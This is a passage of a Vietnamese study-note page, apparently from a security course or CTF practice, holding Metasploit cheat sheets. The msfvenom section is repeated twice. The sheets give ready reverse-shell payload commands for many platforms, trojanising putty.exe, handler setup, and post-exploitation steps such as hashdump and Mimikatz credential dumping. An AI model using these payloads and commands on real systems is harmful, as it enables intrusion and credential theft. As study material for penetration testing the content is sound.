<pre><code>msfvenom -p &lt;payload&gt; LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f &lt;format&gt; -o &lt;file&gt;
</code></pre>
<h4>Các flag quan trọng</h4>
<ul>
<li><code>-p</code> (payload) – chọn payload</li>
<li><code>-f</code> (format) – định dạng output (<code>exe</code>, <code>elf</code>, <code>raw</code>, <code>c</code>, <code>python</code>, <code>powershell</code>, <code>hex</code>, <code>base64</code>...)</li>
<li><code>-o</code> (output) – ghi ra file</li>
<li><code>-e</code> (encoder) – chọn encoder (<code>x86/shikata_ga_nai</code>)</li>
<li><code>-i</code> (iterations) – số lần lặp encode</li>
<li><code>-b</code> (bad chars) – tránh ký tự xấu (<code>&#39;\x00\x0a\x0d&#39;</code>)</li>
<li><code>-x</code> (template) – file mẫu để chèn payload</li>
<li><code>-k</code> (keep) – giữ nguyên chức năng file mẫu</li>
<li><code>-a</code> (architecture) – kiến trúc (<code>x64</code>, <code>x86</code>)</li>
<li><code>--platform</code> – nền tảng (<code>windows</code>, <code>linux</code>, <code>android</code>)</li>
<li><code>-n</code> (nopsled) – thêm NOP sled N bytes</li>
<li><code>-l</code> (list) – liệt kê payloads/formats/encoders/platforms/archs</li>
<li><code>--list-options</code> – xem options của payload</li>
</ul>
<h4>Staged vs Stageless</h4>
<ul>
<li><strong>Staged</strong> (dấu <code>/</code>): <code>windows/x64/meterpreter/reverse_tcp</code> – file nhỏ, cần handler serve stage</li>
<li><strong>Stageless</strong> (dấu <code>_</code>): <code>windows/x64/meterpreter_reverse_tcp</code> – tự chứa, đáng tin, dùng cho file standalone</li>
</ul>
<h4>Executable vs Transform formats</h4>
<ul>
<li><strong>Executable</strong>: <code>exe</code>, <code>elf</code>, <code>macho</code>, <code>msi</code>, <code>apk</code>, <code>war</code>, <code>dll</code> – tạo file chạy trực tiếp</li>
<li><strong>Transform</strong>: <code>raw</code>, <code>c</code>, <code>csharp</code>, <code>python</code>, <code>powershell</code>, <code>hex</code>, <code>base64</code> – dữ liệu để nhúng vào script/loader</li>
</ul>
<h4>Công thức payload phổ biến</h4>
<table>
<thead>
<tr>
<th>Mục tiêu</th>
<th>Lệnh</th>
</tr>
</thead>
<tbody><tr>
<td>Windows EXE</td>
<td><code>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f exe -o shell.exe</code></td>
</tr>
<tr>
<td>Linux ELF</td>
<td><code>msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f elf -o shell.elf</code></td>
</tr>
<tr>
<td>PHP web shell</td>
<td><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f raw -o shell.php</code></td>
</tr>
<tr>
<td>Python one-liner</td>
<td><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f raw</code></td>
</tr>
<tr>
<td>Raw shellcode C</td>
<td><code>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f c</code></td>
</tr>
<tr>
<td>Android APK</td>
<td><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -o evil.apk</code></td>
</tr>
<tr>
<td>Java WAR</td>
<td><code>msfvenom -p java/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f war -o shell.war</code></td>
</tr>
<tr>
<td>ASPX (IIS)</td>
<td><code>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f aspx -o shell.aspx</code></td>
</tr>
<tr>
<td>JSP</td>
<td><code>msfvenom -p java/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f jsp -o shell.jsp</code></td>
</tr>
</tbody></table>
<h4>Encoding (không phải trốn AV)</h4>
<ul>
<li>Mục đích chính: <strong>loại bỏ bad chars</strong>, đáp ứng giới hạn ký tự.</li>
<li><code>-e x86/shikata_ga_nai -i 3</code></li>
<li><code>-b &#39;\x00\x0a\x0d&#39;</code> – msfvenom tự chọn encoder nếu cần.</li>
<li>⚠️ Không bypass được AV hiện đại (EDR, AMSI, sandboxing).</li>
</ul>
<h4>Template Injection (chèn payload vào file có sẵn)</h4>
<ul>
<li><code>-x /path/to/putty.exe</code> – dùng file mẫu</li>
<li><code>-k</code> – giữ nguyên chức năng file gốc</li>
<li>Nhược điểm: hash thay đổi, mất chữ ký số, dễ bị AV phát hiện.</li>
</ul>
<h4>Multi/Handler (bắt reverse connection)</h4>
<pre><code>use exploit/multi/handler
set PAYLOAD &lt;same_as_msfvenom&gt;
set LHOST &lt;IP&gt;
set LPORT &lt;port&gt;
run -j
</code></pre>
<ul>
<li><code>ExitOnSession false</code> – bắt nhiều session</li>
<li><code>AutoRunScript post/windows/manage/migrate</code> – tự migrate khi session mở</li>
</ul>
<h4>Workflow Generate → Deliver → Catch → Post-Exploit</h4>
<ol>
<li>Tạo payload bằng <code>msfvenom</code></li>
<li>Mở handler <code>exploit/multi/handler</code> (khớp chính xác)</li>
<li>Upload payload (SMB, SSH, web upload...)</li>
<li>Thực thi payload trên mục tiêu</li>
<li>Nhận session → <code>sysinfo</code>, <code>getuid</code>, <code>hashdump</code>, <code>search -f flag*</code>...</li>
</ol>
<blockquote>
<p>💡 Quy tắc vàng: PAYLOAD, LHOST, LPORT trong msfvenom và handler phải giống hệt.</p>
</blockquote>
<p>Chúc mày thao tác ngon lành! 😎</p>

    </div>
  </div>
</foreignObject>

</g>
<g transform="translate(98.59,25.19)">
<path d="M-40.17 3700.04 C118.05 3698.25,276.45 3697.94,579.58 3699.77 M-40.22 3700.37 C108.07 3700.61,257.28 3700.43,580.16 3700.36 M580.64 3699.77 C578.05 3729.68,578.95 3762.34,578.01 3819.10 M579.45 3700.02 C581.67 3729.06,580.72 3757.27,580.70 3820.93 M579.21 3820.25 C364.88 3818.44,149.67 3818.61,-40.15 3819.48 M580.34 3819.80 C405.09 3818.91,230.46 3819.16,-39.79 3819.69 M-41.36 3818.50 C-39.22 3776.11,-39.31 3726.51,-41.34 3700.48 M-40.61 3820.30 C-38.93 3777.08,-38.25 3732.27,-39.89 3700.73" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
</svg>
    </div>
  </div>
</div>


---

## 📖 Nội dung chi tiết bài viết (Writeup)

<div id="doc-7897ea6841b5b73971fcd8d5ac2035484a812b2b" class="notion-callout-card">

### 🌲 Msfconsole Commands (Tree)

**Tìm & xem**
- `search` → tìm module (kèm filter: `type`, `platform`, `cve`, `name`)
- `info` → chi tiết module

**Chọn & cấu hình**
- `use <module>` → nạp module
- `show options` → xem tham số
- `show payloads` → xem payload tương thích
- `set` → gán tham số (cục bộ)
- `setg` → gán tham số (toàn cục)
- `set PAYLOAD` → chọn payload
- `unset` / `unset all` → xóa / reset

**Chạy**
- `check` → kiểm tra an toàn
- `exploit` / `run` → chạy module
- `exploit -z` → chạy & background
- `back` → thoát module

**Quản lý session**
- `sessions` → liệt kê
- `sessions -i <id>` → tương tác
- `background` / `Ctrl+Z` → background
- `sessions -k <id>` → kill 1
- `sessions -K` → kill all

</div>

---

<div id="doc-e12c9e6514d9a9b9d5afc17438099f0cdd1a1603" class="notion-callout-card">

### 📋 Cheatsheet: Metasploit Scanning & Database

#### Database & Workspace
- `sudo msfdb init` → khởi tạo database
- `db_status` → kiểm tra kết nối DB
- `workspace` → xem workspace hiện tại
- `workspace -a <tên>` → tạo workspace mới
- `workspace <tên>` → chuyển workspace
- `workspace -d <tên>` → xóa workspace

#### Scan & lưu vào DB
- `db_nmap -sV -O <IP>` → quét Nmap, lưu kết quả vào DB
- `db_import <file.xml>` → nhập kết quả scan ngoài
- `db_export` → xuất dữ liệu DB

#### Xem dữ liệu
- `hosts` → liệt kê host
- `services` → liệt kê dịch vụ/cổng
- `services -S <tên>` → lọc theo tên dịch vụ
- `creds` → xem credential thu thập
- `vulns` → xem lỗ hổng đã ghi nhận

#### Tự điền RHOSTS từ DB
- `hosts -R` → gán tất cả host vào RHOSTS
- `services -S <tên> -R` → gán host có dịch vụ cụ thể vào RHOSTS

#### Module Scanner thường dùng
| Mục đích | Module |
|----------|--------|
| Quét cổng TCP | `auxiliary/scanner/portscan/tcp` |
| Check MS17-010 | `auxiliary/scanner/smb/smb_ms17_010` |
| Brute SMB login | `auxiliary/scanner/smb/smb_login` |
| Check anonymous FTP | `auxiliary/scanner/ftp/ftp_anonymous` |
| Lấy tên máy (NetBIOS) | `auxiliary/scanner/netbios/nbname` |
| Lấy version web server | `auxiliary/scanner/http/http_version` |

> 💡 **Quy trình:** `db_nmap` → xem `services` → `search type:auxiliary <tên>` → `use` → `set RHOSTS` (hoặc `services -R`) → `run` → `vulns` xem kết quả.

</div>

---

<div id="doc-ece275b27e30610d36713d1b8046ec5935138280" class="notion-callout-card">

### 📋 Cheatsheet: Meterpreter & Post-Exploitation

#### Kiến trúc Meterpreter
- **In-Memory**: Chạy trong RAM, không ghi file ra đĩa.
- **Encrypted Communication**: Traffic mã hóa (TLS/AES).
- **Extensible**: Dùng `load` để nạp thêm extension.

#### Chọn Meterpreter
- **OS**: `windows`, `linux`, `java`, `php`, `python`.
- **Connection**: `reverse_tcp`, `reverse_https`, `bind_tcp`.
- **Staged vs Stageless**: `/` = staged, `_` = stageless.

---

#### Lệnh tình huống (Awareness)
- `sysinfo` – thông tin hệ thống
- `getuid` – user hiện tại
- `getpid` – PID hiện tại
- `ps` – liệt kê process
- `idletime` – thời gian người dùng rời máy

#### Lệnh file system
- `pwd`, `cd`, `ls` – điều hướng
- `cat` – đọc file
- `search -f <pattern> -d <dir>` – tìm file
- `download <remote> <local>` – tải file về
- `upload <local> <remote>` – đưa file lên

#### Lệnh mạng
- `ifconfig` – xem IP/interface
- `netstat` – xem kết nối

#### Lệnh OS
- `shell` – mở cmd/sh
- `execute -f <cmd> -i` – chạy lệnh

---

#### Post-Exploitation
- `migrate <PID>` – chuyển process
- `getsystem` – leo lên SYSTEM
- `hashdump` – lấy hash SAM
- `load kiwi` – nạp Mimikatz
- `creds_all` – lấy mọi credential
- `background` – background session
- `use post/...` + `set SESSION <id>` + `run` – chạy post module

---

#### Quy trình post module
1. `background`
2. `use post/<module>`
3. `set SESSION <id>`
4. `run`

---

#### Ghi nhớ nhanh
- Sau khi exploit, luôn chạy `sysinfo`, `getuid`, `getpid`.
- Muốn leo quyền: `getsystem` → nếu fail, `migrate` sang process SYSTEM rồi thử lại.
- Muốn lấy hash: `hashdump` (cần SYSTEM).
- Muốn lấy mật khẩu plaintext: `load kiwi` + `creds_all`.
- Luôn `help` để xem danh sách lệnh có sẵn.

</div>

---

<div id="doc-01771b58dcd7919226ba46f80de5395776815dce" class="notion-callout-card">

### 📋 Cheatsheet: Metasploit Payload Generation (msfvenom)

#### Cú pháp cơ bản
```
msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> -o <file>
```

#### Các flag quan trọng
- `-p` (payload) – chọn payload
- `-f` (format) – định dạng output (`exe`, `elf`, `raw`, `c`, `python`, `powershell`, `hex`, `base64`...)
- `-o` (output) – ghi ra file
- `-e` (encoder) – chọn encoder (`x86/shikata_ga_nai`)
- `-i` (iterations) – số lần lặp encode
- `-b` (bad chars) – tránh ký tự xấu (`'\x00\x0a\x0d'`)
- `-x` (template) – file mẫu để chèn payload
- `-k` (keep) – giữ nguyên chức năng file mẫu
- `-a` (architecture) – kiến trúc (`x64`, `x86`)
- `--platform` – nền tảng (`windows`, `linux`, `android`)
- `-n` (nopsled) – thêm NOP sled N bytes
- `-l` (list) – liệt kê payloads/formats/encoders/platforms/archs
- `--list-options` – xem options của payload

#### Staged vs Stageless
- **Staged** (dấu `/`): `windows/x64/meterpreter/reverse_tcp` – file nhỏ, cần handler serve stage
- **Stageless** (dấu `_`): `windows/x64/meterpreter_reverse_tcp` – tự chứa, đáng tin, dùng cho file standalone

#### Executable vs Transform formats
- **Executable**: `exe`, `elf`, `macho`, `msi`, `apk`, `war`, `dll` – tạo file chạy trực tiếp
- **Transform**: `raw`, `c`, `csharp`, `python`, `powershell`, `hex`, `base64` – dữ liệu để nhúng vào script/loader

#### Công thức payload phổ biến
| Mục tiêu | Lệnh |
|----------|------|
| Windows EXE | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<port> -f exe -o shell.exe` |
| Linux ELF | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<port> -f elf -o shell.elf` |
| PHP web shell | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<port> -f raw -o shell.php` |
| Python one-liner | `msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<port> -f raw` |
| Raw shellcode C | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<port> -f c` |
| Android APK | `msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -o evil.apk` |
| Java WAR | `msfvenom -p java/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f war -o shell.war` |
| ASPX (IIS) | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<port> -f aspx -o shell.aspx` |
| JSP | `msfvenom -p java/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f jsp -o shell.jsp` |

#### Encoding (không phải trốn AV)
- Mục đích chính: **loại bỏ bad chars**, đáp ứng giới hạn ký tự.
- `-e x86/shikata_ga_nai -i 3`
- `-b '\x00\x0a\x0d'` – msfvenom tự chọn encoder nếu cần.
- ⚠️ Không bypass được AV hiện đại (EDR, AMSI, sandboxing).

#### Template Injection (chèn payload vào file có sẵn)
- `-x /path/to/putty.exe` – dùng file mẫu
- `-k` – giữ nguyên chức năng file gốc
- Nhược điểm: hash thay đổi, mất chữ ký số, dễ bị AV phát hiện.

#### Multi/Handler (bắt reverse connection)
```
use exploit/multi/handler
set PAYLOAD <same_as_msfvenom>
set LHOST <IP>
set LPORT <port>
run -j
```
- `ExitOnSession false` – bắt nhiều session
- `AutoRunScript post/windows/manage/migrate` – tự migrate khi session mở

#### Workflow Generate → Deliver → Catch → Post-Exploit
1. Tạo payload bằng `msfvenom`
2. Mở handler `exploit/multi/handler` (khớp chính xác)
3. Upload payload (SMB, SSH, web upload...)
4. Thực thi payload trên mục tiêu
5. Nhận session → `sysinfo`, `getuid`, `hashdump`, `search -f flag*`...

> 💡 Quy tắc vàng: PAYLOAD, LHOST, LPORT trong msfvenom và handler phải giống hệt.

Chúc mày thao tác ngon lành! 😎

</div>

---



### 🔗 Các bài viết liên kết trong sơ đồ

- [[metasploit - post exploit]]
